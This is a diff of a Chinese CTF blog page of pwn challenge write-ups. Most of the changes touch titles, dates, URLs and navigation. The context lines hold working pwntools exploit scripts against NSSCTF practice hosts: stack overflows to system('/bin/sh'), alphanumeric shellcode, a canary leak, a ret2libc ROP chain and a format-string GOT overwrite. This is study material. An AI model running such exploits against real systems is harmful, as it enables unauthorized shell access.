@@ -25,12 +25,12 @@
 
   
 
-<link rel="canonical" href="https://lookhui.github.io/c0iq/PWN%E5%88%B7%E9%A2%98%E8%A7%A3%E6%9E%90/">
+<link rel="canonical" href="https://lookhui.github.io/c0iq/PWN%E5%88%B7%E9%A2%98-md/">
 
 
 
   <title>
- |
+PWN刷题解析 |
 look hui = c0iq = lookhui</title>
 <meta name="generator" content="Hexo 7.0.0"></head>
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -58,16 +58,16 @@ look hui = c0iq = lookhui</title>
         <div id="brand">
           <div class="pjax">
           
-  <h1 itemprop="name headline">
+  <h1 itemprop="name headline">PWN刷题解析
   </h1>
   
 <div class="meta">
-  <span class="item" title="创建时间：2023-12-12 20:53:55">
+  <span class="item" title="创建时间：2023-12-13 08:46:10">
     <span class="icon">
       <i class="ic i-calendar"></i>
     </span>
     <span class="text">发表于</span>
-    <time itemprop="dateCreated datePublished" datetime="2023-12-12T20:53:55+08:00">2023-12-12</time>
+    <time itemprop="dateCreated datePublished" datetime="2023-12-13T08:46:10+08:00">2023-12-13</time>
   </span>
 </div>
 
@@ -100,12 +100,12 @@ look hui = c0iq = lookhui</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giph4wqtg4j20zk0m8x6p.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicljgocqbj20zk0m8e81.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giph4baakhj20zk0m8h5q.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipesng5oej20zk0m87d4.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicitcxhpij20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipev1x5e4j20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giph4baakhj20zk0m8h5q.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclgrvbd6j20zk0m8qv5.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipesrnqv3j20zk0m8ava.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclx29mstj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclfdu6exj20zk0m87hw.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gicm0fdw5cj20zk0m8hdt.jpg"></li>
         </ul>
       </div>
     </header>
@@ -134,7 +134,7 @@ look hui = c0iq = lookhui</title>
 </div>
 
     <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
-  <link itemprop="mainEntityOfPage" href="https://lookhui.github.io/c0iq/PWN%E5%88%B7%E9%A2%98%E8%A7%A3%E6%9E%90/">
+  <link itemprop="mainEntityOfPage" href="https://lookhui.github.io/c0iq/PWN%E5%88%B7%E9%A2%98-md/">
 
   <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="image" content="/c0iq/images/avatar.jpg">
@@ -169,7 +169,7 @@ tips:11.28125 表示在内存存储就是 0x41348000</p>
 <p>这个题就更简单了，像前面那个题，这个题还不需要判断 read 的长度随便输就行能达到溢出点就行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28240)</span><br><span class="line">payload=b&#x27;a&#x27;*0x18+p64(0x4006E6)</span><br><span class="line">p.sendlineafter(&#x27;name:&#x27;,&#x27;-1&#x27;)</span><br><span class="line">p.sendlineafter(&#x27;name?&#x27;,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h5 id="nisactf-2022ezstack"><a class="markdownIt-Anchor" href="#nisactf-2022ezstack">#</a> [NISACTF 2022]ezstack</h5>
-<p>打开后用 ida 查看到代码里面没有 system (’/bin/sh’) 但是有 system 并且在 data 段里面有 /bin/sh 那我们直接让代码溢出调用 system 和 /bin/sh</p>
+<p>打开后用 ida 查看到代码里面没有 system (‘/bin/sh’) 但是有 system 并且在 data 段里面有 /bin/sh 那我们直接让代码溢出调用 system 和 /bin/sh</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28961)</span><br><span class="line">payload=b&#x27;a&#x27;*(0x48+0x4)+p32(0x08048512)+p32(0x804A024)</span><br><span class="line">p.sendlineafter(&#x27;NISACTF&#x27;,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h5 id="watevrctf-2019voting-machine-1"><a class="markdownIt-Anchor" href="#watevrctf-2019voting-machine-1">#</a> [watevrCTF 2019]Voting Machine 1</h5>
 <p>这个题有两个解法，输入 0x2 或者 0xa</p>
@@ -253,7 +253,7 @@ tips:11.28125 表示在内存存储就是 0x41348000</p>
 <h5 id="hnctf-2022-week1safe_shellcode"><a class="markdownIt-Anchor" href="#hnctf-2022-week1safe_shellcode">#</a> [HNCTF 2022 Week1]safe_shellcode</h5>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28251)</span><br><span class="line">payload=&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00gao@fossa&quot;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h5 id="hgame-2022-week1test-your-gdb"><a class="markdownIt-Anchor" href="#hgame-2022-week1test-your-gdb">#</a> [HGAME 2022 week1]test your gdb</h5>
-<figure class="highlight plaintext"><figcaption><span>pwn import *</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#p = process(&quot;./../testYourGdb&quot;)</span><br><span class="line">elf = ELF(&quot;./../testYourGdb&quot;)</span><br><span class="line">p = remote(&quot;1.14.71.254&quot;,28150)</span><br><span class="line"></span><br><span class="line">cmpText = p64(0xb0361e0e8294f147) + p64(0x8c09e0c34ed8a6a9)</span><br><span class="line"></span><br><span class="line">binsh = 0x401256</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;word\n&#x27;)</span><br><span class="line">p.send(cmpText)</span><br><span class="line"></span><br><span class="line">p.recv(0x18)</span><br><span class="line">canary = u64(p.recv(8))</span><br><span class="line">print(hex(canary))</span><br><span class="line"></span><br><span class="line">padding = b&#x27;a&#x27; * (0x28 - 0x10)</span><br><span class="line">payload = padding + p64(canary) + p64(0) + p64(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><figcaption><span>pwn import *</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#p = process(&quot;./../testYourGdb&quot;)</span><br><span class="line">elf = ELF(&quot;./../testYourGdb&quot;)</span><br><span class="line">p = remote(&quot;1.14.71.254&quot;,28150)</span><br><span class="line"></span><br><span class="line">cmpText = p64(0xb0361e0e8294f147) + p64(0x8c09e0c34ed8a6a9)</span><br><span class="line"></span><br><span class="line">binsh = 0x401256</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;word\n&#x27;)</span><br><span class="line">p.send(cmpText)</span><br><span class="line"></span><br><span class="line">p.recv(0x18)</span><br><span class="line">canary = u64(p.recv(8))</span><br><span class="line">print(hex(canary))</span><br><span class="line"></span><br><span class="line">padding = b&#x27;a&#x27; * (0x28 - 0x10)</span><br><span class="line">payload = padding + p64(canary) + p64(0) + p64(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h5 id="hnctf-2022-week1ezr0p64"><a class="markdownIt-Anchor" href="#hnctf-2022-week1ezr0p64">#</a> [HNCTF 2022 Week1]ezr0p64</h5>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">已经给了.so.6了直接打ret2libc</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">context.os=&#x27;linux&#x27;</span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./ezrop64&#x27;)</span><br><span class="line"></span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28053)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x4012a3</span><br><span class="line"></span><br><span class="line">ret = 0x40101a</span><br><span class="line"></span><br><span class="line">vuln = elf.sym[&#x27;vuln&#x27;]</span><br><span class="line">p.recvuntil(b&quot;:&quot;)</span><br><span class="line"></span><br><span class="line">puts_addr = int(p.recv(14),16)</span><br><span class="line"></span><br><span class="line">log.info(puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">binsh = libc_base + next(libc.search(b&quot;/bin/sh\x00&quot;))</span><br><span class="line">payload = b&#x27;a&#x27;*0x108 + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h5 id="gdouctf-2023真男人下120层"><a class="markdownIt-Anchor" href="#gdouctf-2023真男人下120层">#</a> [GDOUCTF 2023] 真男人下 120 层</h5>
@@ -334,6 +334,7 @@ tips:11.28125 表示在内存存储就是 0x41348000</p>
 <h5 id="moectf-2022babyfmt"><a class="markdownIt-Anchor" href="#moectf-2022babyfmt">#</a> [MoeCTF 2022]babyfmt</h5>
 <p>查看到这个题很简单的处理方法，里面有个 printf (buf) 可以直接判断为字符串溢出，没开 FULL，基本思路就是格式化字符串劫持 got 表，找到偏移之后试了几种修改，改发可以说是多种多样了。接收 backdoor 没啥用，可以改 got 表直接用 system 的 got 表就行，如果开 FULL RELRO 的话可以覆盖 ret 地址，给的地址还有点用</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=process(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28523)</span><br><span class="line">print_got=elf.got[&#x27;printf&#x27;]</span><br><span class="line">p.recvuntil(&quot;\n&quot;)</span><br><span class="line">p.sendline(&quot;%10$s&quot;)</span><br><span class="line">baskdoor=int(p.recv(9),16)</span><br><span class="line"></span><br><span class="line">payload=fmtstr_payload(11,&#123;print_got:baskdoor&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
   </div>
 
    <footer>
@@ -344,7 +345,7 @@ tips:11.28125 表示在内存存储就是 0x41348000</p>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2023-12-07 14:43:01" itemprop="dateModified" datetime="2023-12-07T14:43:01+08:00">2023-12-07</time>
+    <time title="修改时间：2023-12-13 08:48:59" itemprop="dateModified" datetime="2023-12-13T08:48:59+08:00">2023-12-13</time>
   </span>
 </div>
 
@@ -380,7 +381,7 @@ tips:11.28125 表示在内存存储就是 0x41348000</p>
   </li>
   <li class="link">
     <strong>本文链接：</strong>
-    <a href="https://lookhui.github.io/c0iq/PWN%E5%88%B7%E9%A2%98%E8%A7%A3%E6%9E%90/" title="">https://lookhui.github.io/c0iq/PWN刷题解析/</a>
+    <a href="https://lookhui.github.io/c0iq/PWN%E5%88%B7%E9%A2%98-md/" title="PWN刷题解析">https://lookhui.github.io/c0iq/PWN刷题-md/</a>
   </li>
   <li class="license">
     <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
@@ -397,8 +398,24 @@ tips:11.28125 表示在内存存储就是 0x41348000</p>
 
 <div class="post-nav">
     <div class="item left">
+      
+
+  <a href="/c0iq/WEB%E5%88%B7%E9%A2%98-md/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipew8gmvyj20zk0m87wh.jpg" title="WEB刷题解析">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>WEB刷题解析</h3>
+  </a>
+
     </div>
     <div class="item right">
+      
+
+  <a href="/c0iq/HTB-WEB-md/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclxfdlttj20zk0m8npd.jpg" title="HTB-WEB">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>HTB-WEB</h3>
+  </a>
+
     </div>
 </div>
 
@@ -430,7 +447,7 @@ tips:11.28125 表示在内存存储就是 0x41348000</p>
 <nav class="state">
     <div class="item posts">
       <a href="/c0iq/archives/">
-        <span class="count">1</span>
+        <span class="count">3</span>
         <span class="name">文章</span>
       </a>
     </div>
@@ -455,10 +472,12 @@ tips:11.28125 表示在内存存储就是 0x41348000</p>
 
   <ul id="quick">
     <li class="prev pjax">
+        <a href="/c0iq/WEB%E5%88%B7%E9%A2%98-md/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
     </li>
     <li class="up"><i class="ic i-arrow-up"></i></li>
     <li class="down"><i class="ic i-arrow-down"></i></li>
     <li class="next pjax">
+        <a href="/c0iq/HTB-WEB-md/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
     </li>
     <li class="percent"></li>
   </ul>
@@ -482,7 +501,25 @@ tips:11.28125 表示在内存存储就是 0x41348000</p>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/c0iq/PWN%E5%88%B7%E9%A2%98%E8%A7%A3%E6%9E%90/" title="未命名">未命名</a></span>
+    <span><a href="/c0iq/PWN%E5%88%B7%E9%A2%98-md/" title="PWN刷题解析">PWN刷题解析</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/c0iq/WEB%E5%88%B7%E9%A2%98-md/" title="WEB刷题解析">WEB刷题解析</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/c0iq/HTB-WEB-md/" title="HTB-WEB">HTB-WEB</a></span>
   </li>
 
   </ul>
@@ -513,7 +550,7 @@ tips:11.28125 表示在内存存储就是 0x41348000</p>
   </div>
 <script data-config type="text/javascript">
   var LOCAL = {
-    path: 'PWN刷题解析/',
+    path: 'PWN刷题-md/',
     favicon: {
       show: "（●´3｀●）やれやれだぜ",
       hide: "(´Д｀)大変だ！"
